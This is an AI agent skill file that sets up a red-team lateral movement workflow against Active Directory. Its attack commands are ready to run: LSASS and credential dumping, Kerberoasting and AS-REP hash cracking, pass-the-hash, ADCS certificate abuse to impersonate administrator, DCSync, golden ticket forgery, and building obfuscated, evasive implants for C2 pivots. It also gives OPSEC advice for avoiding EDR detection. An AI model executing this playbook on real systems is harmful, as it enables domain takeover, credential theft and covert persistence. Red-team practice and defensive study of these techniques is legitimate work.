---
name: red-lateral
description: "Red team lateral movement. AD attack chain (Kerberoasting, AS-REP, DCSync, ADCS ESC1-13, Silver/Golden/Diamond Ticket, BloodHound path execution), BOF-first in-memory execution, Phantom TCP/named-pipe pivots, attack-path edge recording per movement step, lateral movement map. Triggers: 'red lateral', 'lateral movement', 'ad attack', 'kerberos', 'dcsync', 'bloodhound', 'pivot', 'bof lateral', 'pass the hash', 'golden ticket', 'adcs'."
version: 2.0.0
phase: ["exploitation"]
category: ["exploitation", "active-directory"]
tools: ["phantom", "bloodhound", "crackmapexec", "netexec", "impacket", "certipy", "rubeus"]
tags: ["red-team", "lateral-movement", "ad", "kerberos", "dcsync", "adcs", "bloodhound", "bof", "pivot", "pass-the-hash"]
---

# Red Team — Lateral Movement

You are moving through the network from the initial foothold toward the engagement objective. Every movement step produces an attack-path edge with evidence.

**BOF-first discipline:** Prefer in-memory BOF/assembly execution over disk-based tools. Every time you consider uploading a tool, ask: is there a BOF or `execute-assembly` alternative?

**Before every lateral action:**
```
POSITION:    What access do I currently have? (host, user, privileges)
OBJECTIVE:   What is the next target host or privilege I need?
TECHNIQUE:   Why this technique? What evidence justifies it?
OPSEC RISK:  What detection would this trigger? (event IDs, EDR, NetFlow)
ALTERNATIVE: Is there a lower-noise path to the same position?
EVIDENCE:    What artifact proves this step was achieved?
```

---

## Phase 0: Situational Awareness from Current Session

Before any movement, fully understand the current position.

```bash
tmux send-keys -t phantom-server:client 'use <session-id>' Enter
tmux send-keys -t phantom-server:client 'whoami' Enter
tmux send-keys -t phantom-server:client 'hostname' Enter
tmux send-keys -t phantom-server:client 'ipconfig /all' Enter
tmux send-keys -t phantom-server:client 'net user /domain' Enter
tmux send-keys -t phantom-server:client 'net group "Domain Admins" /domain' Enter
tmux send-keys -t phantom-server:client 'ps' Enter
```

---

## Phase 1: BloodHound — AD Attack Path Discovery

Run BloodHound collection via BOF to avoid disk-based SharpHound binary.

```bash
tmux send-keys -t phantom-server:client \
  'execute-assembly /opt/SharpHound/SharpHound.exe -- -c All --zipfilename bh.zip' Enter

tmux send-keys -t phantom-server:client 'download bh.zip /tmp/lateral/' Enter

neo4j start
bloodhound &
```

Import and query:
```cypher
MATCH (u:User)-[:MemberOf*1..]->(g:Group)-[:AdminTo|HasSession|CanRDP]->(c:Computer)
WHERE u.name = "<compromised-user>@<DOMAIN>"
RETURN u,g,c

MATCH p=shortestPath((u:User {name:"<USER>@<DOMAIN>"})-[*1..]->(c:Computer {name:"DC01.<DOMAIN>"}))
RETURN p

MATCH (u:User {owned:true})-[r:MemberOf|AdminTo|HasSession|CanRDP|ExecuteDCOM|AllowedToDelegate|ReadLAPSPassword|ReadGMSAPassword|ForceChangePassword|GenericAll|WriteDacl|WriteOwner|Owns|HasSIDHistory|TrustedBy|AllowedToAct|SQLAdmin|CanPSRemote]->(n)
RETURN u, type(r), n
```

Extract attack path from BloodHound and add to `attack-path.json`.

---

## Phase 2: Credential Dumping (In-Memory)

Prefer BOF nanodump or execute-assembly over disk-based tools.

```bash
tmux send-keys -t phantom-server:client \
  'bof /opt/bof/nanodump.o 1 lsass 1' Enter

tmux send-keys -t phantom-server:client \
  'execute-assembly /opt/Rubeus/Rubeus.exe -- dump /nowrap' Enter

tmux send-keys -t phantom-server:client \
  'execute-assembly /opt/Mimikatz/mimikatz.exe -- "sekurlsa::logonpasswords" "exit"' Enter
```

Extract hashes offline to avoid detection:
```bash
python3 /opt/impacket/examples/secretsdump.py \
  -ntds <ntds.dit> -system <SYSTEM> LOCAL | tee lateral/hashes.txt
```

---

## Phase 3: Kerberos Attacks

### Kerberoasting

```bash
tmux send-keys -t phantom-server:client \
  'execute-assembly /opt/Rubeus/Rubeus.exe -- kerberoast /nowrap /outfile:lateral/kerberoast.txt' Enter

python3 /opt/impacket/examples/GetUserSPNs.py \
  <domain>/<user>:<password> -dc-ip <dc-ip> -request \
  -outputfile lateral/spn-hashes.txt

hashcat -m 13100 lateral/spn-hashes.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule \
  -o lateral/cracked-spns.txt
```

### AS-REP Roasting

```bash
python3 /opt/impacket/examples/GetNPUsers.py \
  <domain>/ -usersfile lateral/userlist.txt \
  -no-pass -dc-ip <dc-ip> \
  -outputfile lateral/asrep-hashes.txt

hashcat -m 18200 lateral/asrep-hashes.txt /usr/share/wordlists/rockyou.txt \
  -o lateral/cracked-asrep.txt
```

### Pass-the-Hash / Pass-the-Ticket

```bash
crackmapexec smb <target-range> \
  -u <user> -H <ntlm-hash> \
  --continue-on-success \
  -x "whoami" 2>/dev/null | tee lateral/pth-results.txt

export KRB5CCNAME=/tmp/ticket.ccache
python3 /opt/impacket/examples/wmiexec.py \
  -k -no-pass <domain>/<user>@<target>
```

---

## Phase 4: ADCS Attack Chains (ESC1–ESC8)

### Enumerate templates

```bash
certipy find \
  -u <user>@<domain> -p <password> \
  -dc-ip <dc-ip> \
  -stdout | tee lateral/certipy-find.txt

certipy find \
  -u <user>@<domain> -p <password> \
  -dc-ip <dc-ip> \
  -vulnerable -stdout
```

### ESC1 — Misconfigured template (client auth + enroll rights + SAN)

```bash
certipy req \
  -u <user>@<domain> -p <password> \
  -ca <CA-Name> \
  -template <vulnerable-template> \
  -upn administrator@<domain> \
  -dc-ip <dc-ip> \
  -out lateral/esc1-admin.pfx

certipy auth \
  -pfx lateral/esc1-admin.pfx \
  -dc-ip <dc-ip> | tee lateral/esc1-auth.txt

grep "Got hash" lateral/esc1-auth.txt
```

### ESC4 — Write permissions on template

```bash
certipy template \
  -u <user>@<domain> -p <password> \
  -template <template-name> \
  -save-old

certipy req \
  -u <user>@<domain> -p <password> \
  -ca <CA-Name> \
  -template <template-name> \
  -upn administrator@<domain>
```

---

## Phase 5: Domain Dominance

### DCSync (Domain Admin or replication rights)

```bash
python3 /opt/impacket/examples/secretsdump.py \
  <domain>/<da-user>:<password>@<dc-ip> \
  -just-dc-ntlm | tee lateral/dcsync-hashes.txt

tmux send-keys -t phantom-server:client \
  'execute-assembly /opt/Mimikatz/mimikatz.exe -- "lsadump::dcsync /domain:<domain> /all /csv" "exit"' Enter
```

### Golden Ticket

```bash
python3 /opt/impacket/examples/secretsdump.py \
  <domain>/<da-user>:<password>@<dc-ip> \
  -just-dc-user krbtgt | tee lateral/krbtgt.txt

KRBTGT_HASH=$(grep "krbtgt" lateral/krbtgt.txt | awk -F: '{print $4}')
DOMAIN_SID=$(python3 /opt/impacket/examples/getPac.py \
  -targetUser administrator <domain>/<da-user>:<password> | grep "Domain SID" | awk '{print $3}')

python3 /opt/impacket/examples/ticketer.py \
  -nthash $KRBTGT_HASH \
  -domain-sid $DOMAIN_SID \
  -domain <domain> administrator

export KRB5CCNAME=administrator.ccache
python3 /opt/impacket/examples/secretsdump.py \
  -k -no-pass dc01.<domain>
```

---

## Phase 6: Lateral Movement Execution

Use Phantom pivots for network segments not directly reachable.

```bash
tmux send-keys -t phantom-server:client 'use <session-id>' Enter
tmux send-keys -t phantom-server:client 'pivot tcp --lhost 0.0.0.0 --lport 9999' Enter

./phantom-client
generate --mtls <pivot-host-ip>:9999 \
  --os windows --arch amd64 \
  --format shellcode \
  --shellcode-encoder shikata-ga-nai \
  --evasion --obfuscate \
  --save /tmp/pivot-implant/

tmux send-keys -t phantom-server:client \
  'execute-assembly /tmp/pivot-implant/implant.exe' Enter
```

Named pipe (lower EDR visibility):
```bash
tmux send-keys -t phantom-server:client \
  'pivot named-pipe --name svchost-pipe' Enter
```

---

## Phase 7: Lateral Movement Map

Record every movement as attack-path edges.

```json
{
  "edges": [
    {
      "from": "N-RT-002",
      "to": "N-RT-003",
      "description": "Kerberoasting → cracked SPN hash → lateral to <server>",
      "evidence_ids": ["lateral/cracked-spns.txt", "lateral/pth-results.txt"],
      "confirmed": true
    },
    {
      "from": "N-RT-003",
      "to": "N-RT-004",
      "description": "ADCS ESC1 → DA cert → DCSync → domain hash dump",
      "evidence_ids": ["lateral/esc1-auth.txt", "lateral/dcsync-hashes.txt"],
      "confirmed": true
    }
  ]
}
```

Update `.omop/red-team/<engagement>/attack-path.json`.

Also maintain a human-readable lateral movement map:
```
Foothold: WORKSTATION01 (user: jsmith, local admin)
  → FILESERVER01 (PTH with jsmith hash, local admin)
  → DC01 (ESC1 + DCSync, Domain Admin)
     → All domain systems (Golden Ticket)
```

Save to `lateral/lateral-movement-map.md`.

---

## OPSEC Checklist Before Proceeding to red-persistence

- [ ] BOF/execute-assembly used instead of disk writes where possible
- [ ] No tools written to easily-detected paths (C:\Windows\Temp\*)
- [ ] Pivot listeners cleaned up from hosts where no longer needed
- [ ] Kerberoasting performed with reasonable ticket request rate
- [ ] DCSync performed from single session only (not repeatedly)
- [ ] Beacon jitter active on all sessions
- [ ] Lateral movement map updated
- [ ] Attack-path JSON updated with all new edges

---

## Output

```
.omop/red-team/<engagement>/lateral/
  bloodhound/
  kerberoast.txt
  cracked-spns.txt
  dcsync-hashes.txt
  certipy-find.txt
  esc1-auth.txt
  lateral-movement-map.md
  phantom-pivots.txt
  attack-path.json  (updated)
```

## Next Skill

`red-persistence` — establish redundant, covert persistence using current access.
